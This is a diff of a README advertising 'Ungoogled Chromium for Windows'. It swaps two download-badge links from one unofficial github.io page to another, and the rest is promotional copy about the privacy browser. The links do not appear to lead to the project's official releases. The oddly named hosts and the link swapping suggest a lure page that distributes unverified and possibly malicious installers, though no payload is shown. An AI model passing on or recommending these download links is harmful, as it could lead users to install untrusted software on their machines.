@@ -4,7 +4,7 @@
 
 ## 📥 Download Ungoogled Chromium for Windows
 
-[![⬇️ Download Ungoogled Chromium](https://img.shields.io/badge/Download-Ungoogled--Chromium-blue?style=for-the-badge&logo=windows)](https://asdeennerhorse.github.io/mogus/Ungoogled)
+[![⬇️ Download Ungoogled Chromium](https://img.shields.io/badge/Download-Ungoogled--Chromium-blue?style=for-the-badge&logo=windows)](https://ungoogled-chromium-for-windows.github.io/.github)
 
 ---
 
@@ -30,7 +30,7 @@ Unlike mainstream browsers, Ungoogled Chromium disables background connections t
 
 It supports Chrome extensions (with manual installation), bookmark import, developer tools, and user customization via flags and settings. Whether you’re seeking a cleaner alternative to Chrome or want a browser with zero tracking, Ungoogled Chromium gives you control without compromise.
 
-[![⬇️ Download Ungoogled Chromium](https://img.shields.io/badge/Download-Ungoogled--Chromium-blue?style=for-the-badge&logo=windows)](https://asdeennerhorse.github.io/mogus/Ungoogled)
+[![⬇️ Download Ungoogled Chromium](https://img.shields.io/badge/Download-Ungoogled--Chromium-blue?style=for-the-badge&logo=windows)](https://ungoogled-chromium-for-windows.github.io/.github)
 
 ---
 
